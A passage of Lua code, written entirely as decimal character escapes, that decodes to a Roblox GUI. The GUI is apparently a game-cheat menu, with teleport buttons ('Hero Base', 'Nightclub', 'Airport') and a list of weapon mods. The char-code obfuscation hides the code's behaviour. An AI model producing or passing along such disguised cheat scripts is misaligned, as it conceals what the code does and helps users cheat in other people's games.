117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\108','\46','\84','\101','\120','\116','\61','\34','\72','\101','\114','\111','\32','\66','\97','\115','\101','\34','\108','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\108','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\109','\46','\78','\97','\109','\101','\61','\34','\99','\108','\117','\98','\34','\109','\46','\80','\97','\114','\101','\110','\116','\61','\99','\59','\109','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\109','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\109','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\55','\48','\48','\48','\48','\48','\48','\50','\44','\48','\44','\48','\46','\53','\57','\52','\54','\56','\49','\55','\52','\44','\48','\41','\109','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\109','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\109','\46','\84','\101','\120','\116','\61','\34','\78','\105','\103','\104','\116','\99','\108','\117','\98','\34','\109','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\109','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\110','\46','\78','\97','\109','\101','\61','\34','\97','\105','\114','\112','\111','\114','\116','\34','\110','\46','\80','\97','\114','\101','\110','\116','\61','\99','\59','\110','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\110','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\110','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\55','\48','\48','\48','\48','\48','\48','\50','\44','\48','\44','\48','\46','\54','\54','\48','\54','\55','\49','\53','\57','\50','\44','\48','\41','\110','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\110','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\110','\46','\84','\101','\120','\116','\61','\34','\65','\105','\114','\112','\111','\114','\116','\34','\110','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\110','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\111','\46','\78','\97','\109','\101','\61','\34','\103','\117','\110','\109','\111','\100','\115','\115','\115','\115','\34','\111','\46','\80','\97','\114','\101','\110','\116','\61','\98','\59','\111','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\48','\46','\49','\56','\56','\50','\51','\53','\44','\48','\46','\49','\56','\56','\50','\51','\53','\44','\48','\46','\49','\56','\56','\50','\51','\53','\41','\111','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\52','\55','\57','\49','\54','\54','\54','\53','\55','\44','\48','\44','\48','\46','\49','\50','\49','\56','\50','\55','\52','\48','\57','\44','\48','\41','\111','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\49','\48','\48','\44','\48','\44','\49','\55','\50','\41','\111','\46','\67','\97','\110','\118','\97','\115','\80','\111','\115','\105','\116','\105','\111','\110','\61','\86','\101','\99','\116','\111','\114','\50','\46','\110','\101','\119','\40','\48','\44','\50','\50','\49','\46','\57','\57','\57','\57','\54','\57','\41','\112','\46','\78','\97','\109','\101','\61','\34','\77','\80','\77','\111','\100','\34','\112','\46','\80','\97','\114','\101','\110','\116','\61','\111','\59','\112','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\112','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\112','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\51','\52','\53','\56','\51','\51','\50','\52','\44','\48','\44','\48','\46','\50','\50','\57','\49','\57','\57','\52','\54','\57','\44','\48','\41','\112','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\112','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\112','\46','\84','\101','\120','\116','\61','\34','\77','\80','\53','\32','\77','\111','\100','\34','\112','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\112','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\112','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\112','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\113','\46','\78','\97','\109','\101','\61','\34','\116','\101','\99','\109','\111','\100','\34','\113','\46','\80','\97','\114','\101','\110','\116','\61','\111','\59','\113','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\113','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\113','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\52','\51','\54','\52','\53','\56','\50','\51','\44','\48','\44','\48','\46','\49','\54','\51','\50','\48','\57','\54','\48','\50','\44','\48','\41','\113','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\113','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\113','\46','\84','\101','\120','\116','\61','\34','\84','\69','\67','\57','\32','\77','\111','\100','\34','\113','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\113','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\113','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\113','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\114','\46','\78','\97','\109','\101','\61','\34','\115','\104','\111','\116','\103','\117','\110','\109','\111','\100','\101','\34','\114','\46','\80','\97','\114','\101','\110','\116','\61','\111','\59','\114','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\114','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\114','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\51','\53','\53','\50','\48','\56','\49','\54','\44','\48','\44','\48','\46','\48','\51','\49','\50','\50','\57','\57','\50','\56','\49','\44','\48','\41','\114','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\114','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\114','\46','\84','\101','\120','\116','\61','\34','\83','\104','\111','\116','\103','\117','\110','\32','\77','\111','\100','\34','\114','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\114','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\114','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\114','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\115','\46','\78','\97','\109','\101','\61','\34','\112','\105','\115','\116','\111','\108','\109','\111','\100','\34','\115','\46','\80','\97','\114','\101','\110','\116','\61','\111','\59','\115','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\115','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\115','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\50','\51','\54','\52','\53','\56','\50','\55','\44','\48','\44','\48','\46','\51','\53','\51','\53','\54','\53','\48','\48','\55','\44','\48','\41','\115','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\115','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\115','\46','\84','\101','\120','\116','\61','\34','\80','\105','\115','\116','\111','\108','\32','\77','\111','\100','\34','\115','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\115','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\115','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\115','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\116','\46','\78','\97','\109','\101','\61','\34','\98','\97','\116','\111','\110','\109','\111','\100','\34','\116','\46','\80','\97','\114','\101','\110','\116','\61','\111','\59','\116','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\116','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\116','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\50','\52','\53','\56','\51','\51','\51','\52','\44','\48','\44','\48','\46','\52','\49','\52','\52','\55','\56','\54','\44','\48','\41','\116','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\116','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\116','\46','\84','\101','\120','\116','\61','\34','\66','\97','\116','\111','\110','\32','\77','\111','\100','\34','\116','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\116','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\116','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\116','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\117','\46','\78','\97','\109','\101','\61','\34','\115','\110','\105','\112','\101','\114','\109','\111','\100','\34','\117','\46','\80','\97','\114','\101','\110','\116','\61','\111','\59','\117','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\117','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\117','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\51','\53','\53','\50','\48','\56','\49','\54','\44','\48','\44','\48','\46','\48','\57','\52','\54','\56','\49','\55','\49','\44','\48','\41','\117','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\117','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\117','\46','\84','\101','\120','\116','\61','\34','\83','\110','\105','\112','\101','\114','\32','\77','\111','\100','\34','\117','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\117','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\117','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\117','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\118','\46','\78','\97','\109','\101','\61','\34','\115','\112','\97','\115','\109','\111','\100','\34','\118','\46','\80','\97','\114','\101','\110','\116','\61','\111','\59','\118','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\118','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\118','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\50','\54','\48','\48','\48','\48','\48','\50','\44','\48','\44','\48','\46','\50','\56','\55','\56','\48','\55','\49','\48','\55','\44','\48','\41','\118','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\118','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\118','\46','\84','\101','\120','\116','\61','\34','\83','\80','\65','\83','\32','\77','\111','\100','\34','\118','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\118','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\118','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\118','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\119','\46','\78','\97','\109','\101','\61','\34','\112','\114','\111','\116','\111','\110','\109','\111','\100','\34','\119','\46','\80','\97','\114','\101','\110','\116','\61','\111','\59','\119','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\119','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\119','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\52','\52','\53','\56','\51','\51','\51','\44','\48','\44','\48','\46','\52','\56','\53','\53','\52','\52','\53','\54','\50','\44','\48','\41','\119','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\119','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\119','\46','\84','\101','\120','\116','\61','\34','\80','\114','\111','\116','\111','\110','\32','\77','\111','\100','\34','\119','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\119','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\119','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\119','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\120','\46','\78','\97','\109','\101','\61','\34','\105','\110','\102','\101','\114','\110','\111','\109','\111','\112','\100','\34','\120','\46','\80','\97','\114','\101','\110','\116','\61','\111','\59','\120','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\120','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\120','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\53','\52','\53','\56','\51','\51','\51','\53','\44','\48','\44','\48','\46','\53','\52','\56','\57','\57','\54','\51','\56','\57','\44','\48','\41','\120','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\120','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\120','\46','\84','\101','\120','\116','\61','\34','\73','\110','\102','\101','\114','\110','\111','\32','\77','\111','\100','\34','\120','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\120','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\120','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\120','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\121','\46','\78','\97','\109','\101','\61','\34','\118','\97','\110','\116','\97','\109','\111','\100','\34','\121','\46','\80','\97','\114','\101','\110','\116','\61','\111','\59','\121','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\121','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\121','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\53','\52','\53','\56','\51','\51','\51','\53','\44','\48','\44','\48','\46','\54','\48','\57','\57','\49','\48','\49','\51','\49','\44','\48','\41','\121','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\121','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\121','\46','\84','\101','\120','\116','\61','\34','\86','\97','\110','\116','\97','\32','\77','\111','\100','\34','\121','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\121','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\121','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\121','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\122','\46','\78','\97','\109','\101','\61','\34','\112','\104','\97','\110','\116','\111','\109','\109','\111','\100','\34','\122','\46','\80','\97','\114','\101','\110','\116','\61','\111','\59','\122','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\122','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\122','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\53','\52','\53','\56','\51','\51','\51','\53','\44','\48','\44','\48','\46','\54','\55','\56','\52','\51','\56','\48','\48','\56','\44','\48','\41','\122','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\122','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\122','\46','\84','\101','\120','\116','\61','\34','\80','\104','\97','\110','\116','\111','\109','\32','\77','\111','\100','\34','\122','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\122','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\122','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\122','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\65','\46','\78','\97','\109','\101','\61','\34','\118','\111','\108','\116','\114','\111','\110','\109','\111','\100','\34','\65','\46','\80','\97','\114','\101','\110','\116','\61','\111','\59','\65','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\65','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\65','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\53','\52','\53','\56','\51','\51','\51','\53','\44','\48','\44','\48','\46','\55','\52','\54','\57','\54','\53','\57','\52','\53','\44','\48','\41','\65','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\65','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\65','\46','\84','\101','\120','\116','\61','\34','\86','\111','\108','\116','\114','\111','\110','\32','\77','\111','\100','\34','\65','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\65','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\65','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\65','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\66','\46','\78','\97','\109','\101','\61','\34','\102','\114','\111','\115','\116','\109','\111','\100','\34','\66','\46','\80','\97','\114','\101','\110','\116','\61','\111','\59','\66','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\66','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\66','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\53','\52','\53','\56','\51','\51','\51','\53','\44','\48','\44','\48','\46','\56','\49','\50','\57','\53','\53','\55','\57','\55','\44','\48','\41','\66','\46','\83','\105','\122','\101','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\44','\54','\53','\44','\48','\44','\49','\54','\41','\66','\46','\70','\111','\110','\116','\61','\69','\110','\117','\109','\46','\70','\111','\110','\116','\46','\71','\111','\116','\104','\97','\109','\83','\101','\109','\105','\98','\111','\108','\100','\59','\66','\46','\84','\101','\120','\116','\61','\34','\70','\114','\111','\115','\116','\98','\105','\116','\101','\32','\77','\111','\100','\34','\66','\46','\84','\101','\120','\116','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\66','\46','\84','\101','\120','\116','\83','\99','\97','\108','\101','\100','\61','\116','\114','\117','\101','\59','\66','\46','\84','\101','\120','\116','\83','\105','\122','\101','\61','\49','\52','\59','\66','\46','\84','\101','\120','\116','\87','\114','\97','\112','\112','\101','\100','\61','\116','\114','\117','\101','\59','\67','\46','\78','\97','\109','\101','\61','\34','\97','\107','\109','\111','\100','\34','\67','\46','\80','\97','\114','\101','\110','\116','\61','\111','\59','\67','\46','\66','\97','\99','\107','\103','\114','\111','\117','\110','\100','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\48','\46','\54','\54','\54','\54','\54','\55','\44','\48','\41','\67','\46','\66','\111','\114','\100','\101','\114','\67','\111','\108','\111','\114','\51','\61','\67','\111','\108','\111','\114','\51','\46','\110','\101','\119','\40','\49','\44','\49','\44','\49','\41','\67','\46','\80','\111','\115','\105','\116','\105','\111','\110','\61','\85','\68','\105','\109','\50','\46','\110','\101','\119','\40','\48','\46','\49','\55','\